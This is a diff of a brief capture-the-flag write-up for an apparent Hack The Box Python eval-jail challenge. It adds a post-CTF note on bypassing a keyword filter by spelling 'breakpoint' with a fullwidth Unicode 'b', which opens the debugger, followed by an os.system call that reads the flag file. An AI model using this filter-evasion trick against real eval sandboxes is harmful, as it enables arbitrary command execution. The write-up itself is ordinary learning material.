@@ -21,3 +21,18 @@ print(open("flag.txt", "r").read())
 `nc 94.237.50.221 53625`
 
 HTB{3v4l_0r_3vuln??}
+
+## Post-CTF
+
+https://youtu.be/EGItzKCxTdQ?si=SblP19F4q7klkAPx&t=8572
+
+Apparently python accepts unicode 'b' (U+FF42)
+
+pass breakpoint with a unicode 'b'
+
+```
+# opens python debugger
+
+import os
+os.system('cat flag.txt')
+```
